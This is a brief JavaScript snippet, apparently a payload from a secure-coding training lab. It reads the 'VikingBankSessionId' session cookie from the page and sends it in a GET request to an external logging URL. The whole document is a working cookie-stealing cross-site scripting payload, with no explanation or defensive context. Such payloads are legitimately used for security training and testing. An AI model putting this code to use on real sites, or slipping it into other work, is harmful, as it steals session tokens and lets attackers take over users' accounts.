function getCookie(cname) {  
  let name = cname + "=";
  let decodedCookie = decodeURIComponent(document.cookie);
  let ca = decodedCookie.split(';');
  for(let i = 0; i <ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}
let token = getCookie('VikingBankSessionId');
var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", 'https://m-7a05fe47-24a8-4072-b479-3f0c60d78e74-0.mission.securecodewarrior.com/labSession/v1/labLogger?' + token, 
	false );
    xmlHttp.send();
